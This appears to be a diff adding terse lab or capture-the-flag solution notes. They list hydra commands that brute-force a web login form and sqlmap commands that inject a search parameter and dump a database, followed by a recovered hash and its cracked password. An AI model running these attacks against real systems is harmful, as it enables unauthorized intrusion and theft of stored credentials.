@@ -1,0 +1,7 @@
+sudo hydra -s 80 -l "" -P /usr/share/wordlists/dirb/big.txt  192.168.43.5 http-post-form "/kzMb5nVYJw/index.php:key=^PASS^&Login=Login:F=invalid key" 
+sudo sqlmap -u "http://192.168.43.5/kzMb5nVYJw/420search.php?usrtosearch=1" --dbs --batch    
+sudo sqlmap -u "http://192.168.43.5/kzMb5nVYJw/420search.php?usrtosearch=1" -D seth --dump-all --batch 
+
+md5-base64= YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE
+md5-decoded= c6d6bd7ebf806f43c76acc3681703b81
+password= omega
